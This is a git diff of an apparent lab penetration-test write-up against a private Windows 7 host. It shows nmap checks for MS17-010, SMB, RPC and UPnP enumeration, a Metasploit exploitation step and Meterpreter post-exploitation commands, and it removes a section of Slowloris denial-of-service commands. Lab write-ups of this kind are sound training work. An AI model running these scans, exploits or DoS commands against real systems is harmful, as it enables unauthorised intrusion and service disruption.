@@ -126,18 +126,22 @@ for host in root.findall('host'):
 
 ### Controled explotation
 
+# 1. Additional verification over MS17-010
+# 2. SMB enumeration (no exploited) 
+
 ```
-# 1. Verificación adicional de MS17-010
 nmap --script smb-vuln-ms17-010 -p 445 192.168.57.20 -oN ms17_verify.txt
-
-# 2. Enumeración SMB (sin explotar)
-nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.57.20
-
-# 3. Verificar si es realmente Windows 7
-nmap -sV --script smb-os-discovery 192.168.57.20 -p 445
 ```
+![ms17_verify](ms17_verify.png)
 
-Metaexploit:
+```
+nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.57.20
+```
+![smb-enumeration](smb-enumeration.png)
+
+
+### Metaexploit:
+
 ```
 msfconsole
 
@@ -156,8 +160,7 @@ exploit
 ![metaexploit](metaexploit.png)
 
 
-
-Enumeration post-explotation:
+#### Enumeration post-explotation:
 ```
 # Meterpreter:
 sysinfo           # Información del sistema
@@ -171,51 +174,26 @@ screenshot        # Capturar pantalla
 ![meterpreter-ps](meterpreter-ps.png)
 
 
-Additional vulnerabilites scanning
-```
-# 1. Escanear vulnerabilidades SMB adicionales
-nmap --script "smb-vuln-*" -p 445 192.168.57.20 -oN smb_all_vulns.txt
+### Additional vulnerabilites scanning
 
-# 2. Verificar NetBIOS vulnerabilidades
-nmap --script nbstat -sU -p 137 192.168.57.20
+1. Additional SMB vulnerabilities scanning
+![smb-all-vulns](smb-all-vulns.png)
 
-# 3. Escanear RPC (puerto 135)
-nmap --script rpc-grind,msrpc-enum -p 135 192.168.57.20
+2. NetBIOS vulnerabilities
+![netbios-vulns](netbios-vulns.png)
 
-# 4. Verificar servicios UPnP (puertos 2869, 5357)
-nmap --script upnp-info -p 2869,5357 192.168.57.20
-```
+3. RPC scaning on port 135
+![rpc-scan](rpc-scan.png)
 
-Basic forenstics from attack
-```
-# 1. Usar enum4linux para enumeración SMB completa
-enum4linux -a 192.168.57.20 > enum4linux_results.txt
-
-# 2. Probar conexión SMB anónima
-smbclient -L //192.168.57.20 -N
-
-# 3. Verificar si hay shares accesibles
-smbmap -H 192.168.57.20+
-```
-
-DoS tests
-```
-# 1. Probar Slowloris (con slowhttptest)
-slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://192.168.57.20:5357 -x 24 -p 3
-
-# 2. Alternativa con Perl (si slowloris.pl está disponible)
-perl slowloris.pl -dns 192.168.57.20 -port 5357 -timeout 1
-```
+4. UPnP services verifications (on ports 2869, 5357)
+![upnp-services](upnp-services.png)
 
 ```
+nmap -Pn --script "smb-vuln-*" -p 445 192.168.57.20 -oN smb_all_vulns.txt
 
+sudo nmap --script nbstat -sU -p 137 192.168.57.20
+
+nmap -Pn --script rpc-grind,msrpc-enum -p 135 192.168.57.20
+
+nmap -Pn --script upnp-info -p 2869,5357 192.168.57.20
 ```
-
-```
-
-```
-
-```
-
-```
-
